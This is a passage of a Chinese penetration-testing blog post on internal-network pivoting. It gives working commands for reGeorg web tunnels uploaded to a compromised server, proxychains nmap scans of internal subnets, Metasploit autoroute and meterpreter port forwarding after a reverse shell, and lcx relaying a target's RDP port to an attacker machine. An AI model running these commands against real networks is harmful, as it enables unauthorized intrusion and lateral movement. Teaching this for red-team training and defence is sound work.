+<p>proxifier注意事项：</p>
+<p>1.direct表示不使用socks5代理，直接请求；block表示阻断请求；proxy socks5表示使用socks5代理服务。</p>
+<p>2.默认不使用proxy socks5，仅对需要的程序使用socks5代理服务。</p>
+<p>配置完成后，访问内网地址：</p>
+<p>以上是windows的操作。</p>
+<p>下面介绍在Linux中使用reGerog+proxychains。</p>
+<p>proxychains是kali里面自带的，这里也给出github地址：<a href="https://github.com/haad/proxychains">https://github.com/haad/proxychains</a></p>
+<p>不过对于reGerog的安装参照windows安装方法，setuptools也需要安装，安装完毕上传tunnel.nosocket.php脚本，尝试建立socks5代理链接：</p>
+<pre><code>python ReGeorgSocKsProxy.py -p 9999 -u http://ip/tunnel.nosocket.php
+</code></pre><p>proxychains安装完毕后需要修改 /etc/proxychains.conf 最后一行：</p>
+<pre><code>socks4那一行修改为以下
+socks5 127.0.0.1 9999
+</code></pre><p>至此，利用proxychains进行socks5代理完成</p>
+<p>通过建立sock5隧道，这样本地的kali和web服务器处于同一个环境。</p>
+<p>使用方法：</p>
+<pre><code>proxychains &lt;运行的命令&gt; &lt;命令参数&gt;
+
+只要在需要代理的命令前面加上proxychains即可
+eg:proxychains firefox 可以使用firefox浏览器远程访问内网服务器
+   proxychains nmap -T4 -A 10.8.0.0/24 扫描内网开放端口
+</code></pre><p>关于proxychains的实战利用请看：<a href="https://www.cnblogs.com/adislj777/p/6980365.html">https://www.cnblogs.com/adislj777/p/6980365.html</a></p>
+<p>不过这样比较慢，现在一般使用msf+proxychains，不过前提是我们获取了一个弹回来的shell，有了shell以后，</p>
+<p>就进行内网代理：</p>
+<pre><code>run get_local_subnets 查看目标主机路由信息
+run autoroute -s 192.168.100.0/22 添加路由(在 -s 前加-d是删除路由)
+</code></pre><p>设置好之后就使用socks5辅助模块</p>
+<p>再配置proxychains.conf 末尾修改成socks5 127.0.0.1 9999就大功告成了，</p>
+<p>扫描内网端口：</p>
+<pre><code>proxychains nmap -sT -Pn –open 192.168.100.1/22
+</code></pre><p>**注意:**由于proxychains无法代理icmp的数据包 所以必须添加-Pn参数 即不检测主机是否存活 直接进行端口tcp扫描</p>
+<p><strong>补充：</strong></p>
+<p>其实也可以直接使用msf的辅助模块进行扫描</p>
+<pre><code>auxiliary/scanner/portscan　　端口扫描
+scanner/portscan/syn　　SYN端口扫描
+scanner/portscan/tcp　　TCP端口扫描
+</code></pre><p><strong>对端口转发的补充</strong></p>
+<p>meterpreter也可以实现端口转发</p>
+<pre><code>meterpreter &gt; portfwd add -l 55555 -r 192.168.16.1 -p 3306
+</code></pre><p>lcx端口转发</p>
+<pre><code>攻击机
+lcx -listen 2222 3333 # 2222为转发端口，3333为本机任意未被占用的端口
+目标主机
+lcx -slave 110.1.1.1 2222 127.0.0.1 3389
+</code></pre><p>另外还有很多使用socks进行内网漫游的方法，这里不在一一细说，具体看大佬博客：</p>
+<blockquote>
+<p><a href="https://www.anquanke.com/post/id/85494">https://www.anquanke.com/post/id/85494</a></p>
+<p><a href="https://blog.csdn.net/Fly_hps/article/details/80634746">https://blog.csdn.net/Fly_hps/article/details/80634746</a></p>
+</blockquote>
+        </div>
+
+        
+<div class="post-archive">
+    <ul class="post-copyright">
+        <li><strong>原文作者：</strong><a rel="author" href="https://blog.taielab.com">码中春秋</a></li>
+        <li style="word-break:break-all"><strong>原文链接：</strong><a href="https://blog.taielab.com/2019-06-05/intranet-roaming-network-traffic-control.html">https://blog.taielab.com/2019-06-05/intranet-roaming-network-traffic-control.html</a></li>
+        <li><strong>版权声明：</strong>本作品采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。</li>
+    </ul>
+</div>
+<br/>
+
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/2019-05-27/intranet-roaming-ss-privoxy.html">内网漫游系列之正向全局代理ss&#43;Privoxy</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://blog.taielab.com/tags/%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8'>内网漫游</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+    <div class="post bg-white">
+      <script src="https://utteranc.es/client.js"
+            repo= "udpsec/blog-comments"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+      </script>
+    </div>
+    
+</div>
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://blog.taielab.com/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://blog.taielab.com">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-11-25/ios-13-checkra-in-repair-the-internet-connection-appears-to-be-offline.html" title="IOS 13.2.2 越狱 修复 The internet connection appears to be offline 错误">IOS 13.2.2 越狱 修复 The internet connection appears to be offline 错误</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-06-29/red-team-and-physical-entry-gear-tips.html" title="护网之红方物理入侵旁门左道">护网之红方物理入侵旁门左道</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-06-05/intranet-roaming-network-traffic-control.html" title="内网漫游系列之流量操控与Socks代理总结">内网漫游系列之流量操控与Socks代理总结</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-05-27/intranet-roaming-ss-privoxy.html" title="内网漫游系列之正向全局代理ss&#43;Privoxy">内网漫游系列之正向全局代理ss&#43;Privoxy</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-05-20/centos-7-upgrade-Kernel.html" title="Centos7安装升级最新内核">Centos7安装升级最新内核</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-05-09/digital-forensics-live-and-dead.html" title="数字取证-死活取证">数字取证-死活取证</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-05-09/centos-7-deploy-local-yum-repository.html" title="Centos7搭建本地yum仓库">Centos7搭建本地yum仓库</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-05-09/osint-101-auto-visual.html" title="OSINT101 技术自动化和可视化">OSINT101 技术自动化和可视化</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-04-21/ubuntu-migrate-to-ssd.html" title="Ubuntu19.04迁移到SSD">Ubuntu19.04迁移到SSD</a>
+    </li>
+    
+    <li>
+        <a href="https://blog.taielab.com/2019-04-16/kali-linux-double-display-solutions.html" title="双显卡电脑安装Kali进系统黑屏和安装双显卡解决方案">双显卡电脑安装Kali进系统黑屏和安装双显卡解决方案</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+<section class="widget">
+    <h3 class="widget-title" style="color:red">福利派送</h3>
+    <ul class="widget-list">
+        
+        <li>
+            <a href="" title="" target="_blank" style="color:red">
+                
+                    
+                
+            </a>
+        </li>
+        
+        <li>
+            <a href="" title="" target="_blank" style="color:red">
+                
+                    
+                
+            </a>
+        </li>
+        
+        <li>
+            <a href="" title="" target="_blank" style="color:red">
+                
+                    
+                
+            </a>
+        </li>
+        
+    </ul>
+</section>
+
+
+    <section class="widget">
+        <h3 class="widget-title">分类</h3>
+<ul class="widget-list">
+    
+    <li><a href="https://blog.taielab.com/categories/IOS%E5%BA%94%E7%94%A8%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8/">IOS应用逆向与安全 (1)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/Linux/">Linux (11)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透 (3)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建 (3)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E5%B7%A5%E5%85%B7%E6%95%88%E7%8E%87/">工具效率 (1)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86/">开源情报收集 (1)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统 (1)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/">数字取证 (1)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E6%95%B0%E5%AD%97%E5%AE%89%E5%85%A8/">数字安全 (30)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库 (2)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E6%A0%91%E8%8E%93%E6%B4%BE/">树莓派 (2)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗 (1)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全 (6)</a></li>
+    
+    <li><a href="https://blog.taielab.com/categories/%E7%BD%91%E7%BB%9C%E8%BF%90%E7%BB%B4/">网络运维 (3)</a></li>
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title">标签</h3>
+<div class="tagcloud">
+    
+    <a href="https://blog.taielab.com/tags/Debian/">Debian</a>
+    
+    <a href="https://blog.taielab.com/tags/IOS/">IOS</a>
+    
+    <a href="https://blog.taielab.com/tags/OSINT/">OSINT</a>
+    
+    <a href="https://blog.taielab.com/tags/archlinux/">archlinux</a>
+    
+    <a href="https://blog.taielab.com/tags/centos/">centos</a>
+    
+    <a href="https://blog.taielab.com/tags/github/">github</a>
+    
+    <a href="https://blog.taielab.com/tags/gitup/">gitup</a>
+    
+    <a href="https://blog.taielab.com/tags/gpg/">gpg</a>
+    
+    <a href="https://blog.taielab.com/tags/hexo/">hexo</a>
+    
+    <a href="https://blog.taielab.com/tags/hugo/">hugo</a>
+    
+    <a href="https://blog.taielab.com/tags/kali-linux/">kali-linux</a>
+    
+    <a href="https://blog.taielab.com/tags/lnmp/">lnmp</a>
+    
+    <a href="https://blog.taielab.com/tags/manjaro/">manjaro</a>
+    
+    <a href="https://blog.taielab.com/tags/meedu/">meedu</a>
+    
+    <a href="https://blog.taielab.com/tags/nessus/">nessus</a>
+    
+    <a href="https://blog.taielab.com/tags/parrot-os/">parrot-os</a>
+    
+    <a href="https://blog.taielab.com/tags/pentestbox/">pentestbox</a>
+    
+    <a href="https://blog.taielab.com/tags/shadowsocks/">shadowsocks</a>
+    
+    <a href="https://blog.taielab.com/tags/tor/">tor</a>
+    
+    <a href="https://blog.taielab.com/tags/ubuntu/">ubuntu</a>
+    
+    <a href="https://blog.taielab.com/tags/vps/">vps</a>
+    
+    <a href="https://blog.taielab.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+    
+    <a href="https://blog.taielab.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4/">内网渗透命令</a>
+    
+    <a href="https://blog.taielab.com/tags/%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/">内网漫游</a>
+    
+    <a href="https://blog.taielab.com/tags/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/">奇淫技巧</a>
+    
+    <a href="https://blog.taielab.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
+    
+    <a href="https://blog.taielab.com/tags/%E6%95%B0%E5%AD%97%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%AF%87/">数字安全基础篇</a>
+    
+    <a href="https://blog.taielab.com/tags/%E6%95%B0%E5%AD%97%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E7%AF%87/">数字安全工具篇</a>
+    
+    <a href="https://blog.taielab.com/tags/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/">数据分析</a>
+    
+    <a href="https://blog.taielab.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/">数据库系统原理</a>
+    
+    <a href="https://blog.taielab.com/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/">树莓派</a>
+    
+    <a href="https://blog.taielab.com/tags/%E6%AD%BB%E6%B4%BB%E5%8F%96%E8%AF%81/">死活取证</a>
+    
+    <a href="https://blog.taielab.com/tags/%E7%89%A9%E7%90%86%E5%85%A5%E4%BE%B5/">物理入侵</a>
+    
+    <a href="https://blog.taielab.com/tags/%E8%B8%8F%E9%9B%AA%E6%97%A0%E7%97%95%E7%B3%BB%E5%88%97/">踏雪无痕系列</a>
+    
+</div>
+    </section>
+
+    
+<section class="widget">
+    <h3 class="widget-title">友情链接</h3>
+    <ul class="widget-list">
+        
+        <li>
+            <a target="_blank" href="#" title=""></a>
+        </li>
+        
+    </ul>
+</section>
+
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://blog.taielab.com/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+    <footer id="footer">
+    <div class="container">
+        &copy; 2020 <a href="https://blog.taielab.com">码中春秋&#39;s Blog By 码中春秋</a>.
+        Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io" target="_blank">Hugo</a>.
+        <a href="https://www.flysnow.org/" target="_blank">Theme</a> based on <a href="https://github.com/flysnow-org/maupassant-hugo" target="_blank">maupassant</a>.
+        
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'GA ID', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+    <script src='/js/douban.js'></script>
+
+</body>
+
+</html>
